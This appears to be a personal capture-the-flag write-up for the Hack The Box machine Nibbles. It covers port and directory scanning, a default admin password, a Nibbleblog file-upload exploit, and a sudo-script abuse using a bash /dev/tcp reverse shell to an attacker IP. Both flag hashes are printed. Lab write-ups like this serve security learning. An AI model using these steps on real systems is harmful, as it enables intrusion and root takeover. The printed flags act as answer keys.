https://app.hackthebox.com/machines/Nibbles

```sh
export target=10.10.10.75;
mkdir ~/htb/machines/nibbles && cd ~/htb/machines/nibbles;
mkdir nmap && mkdir gobuster;
```

```sh
sudo nmap -p- -Pn -sS --open -n --min-rate 5000 -oA "nmap/quick" $target
nmap -A -p22,80 -oA nmap/full $target
```

```sh
gobuster dir -u "http://$target/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/dir # nothing found
# after reviewing source code / intercepting request on root dir I found /nibblesblog/ dir
gobuster dir -u "http://$target/nibblesblog/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/dir
```

```sh
# /nibblesblog/README
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

```sh
searchsploit nibbleblog
searchsploit -m php/remote/38489.rb
```

![[Pasted image 20240829163757.png]]

The exploit requires authentication. First I need to get access as a user. Start enumerating the directories found in `gobuster`.
Found something interesting in `http://10.10.10.75/nibbleblog/content/private/users.xml`

![[Pasted image 20240829164639.png]]

Looks like a blacklist of some sort, also reveals `admin`.
Guessed the endpoint `/nibbleblog/admin.php`.

![[Pasted image 20240829164820.png]]

Try `admin:admin` and it fails, checked blacklist.

![[Pasted image 20240829164900.png]]
Looks like blacklist got updated with my IP, better not get banned so look up default creds for `nibbleblog`.

![[Pasted image 20240829165019.png]]

Found this repository on github that reveals project structure and leads to `nibbleblog` docs.
Docs are not accessible and redirect to another technology website. Nibbles is outdated. Maybe check on `archive.org` or look up other exploits to see if they leak some passwords.

![[Pasted image 20240829165314.png]]

Github shows `admin:nibbles` and this works on website. Since `nibbleblog` is deprecated, docs are not freely available nor is the download. The github repo doesn't contain everything that is mentioned in docs for some reason.

![[Pasted image 20240829170525.png]]

This directory exists on target, but not on github repo, so opening `shadow.php` doesn't return anything since it's a php file and the server runs the script before returning the result.

Trying to run ruby exploit doesn't work, so I looked into the one from github which revealed the password.

https://github.com/dix0nym/CVE-2015-6967/blob/main/exploit.py

Looks like it's arbitrary upload in the Plugins -> My Image function. Try to upload php reverse shell.
For some reason uploading manually doesn't work, with exploit from github it works, but the payload file has to have `.php` extension or it won't work.

User obtained, flag
```
a08c3bada0e1f59fe4f0f7116ecd3711
```

Need to privesc to root, possibly run linPEAS but first enumerate manually.

```sh
sudo -l
cat /home/nibbler/personal/stuff/monitor.sh # not found
ls -laR /home/nibbler
```

![[Pasted image 20240829172912.png]]

![[Pasted image 20240829173006.png]]

Looks like directories and the script are missing, I can make those and run as sudo.
Unzipping `personal.zip` creates the directories and the `monitor.sh` script.

Upgrade shell to easily create script.
```sh
which python
which python3
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

```sh
#Victim
cd personal/stuff
rm monitor.sh
vim monitor.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.6/1212 0>&1

#Attacker
nc -lvnp 1212
whoami
#-> root gained
cat /root/root.txt
```

![[Pasted image 20240829173845.png]]

```
bf9a60cb1e181d41673bda57543b76e6
```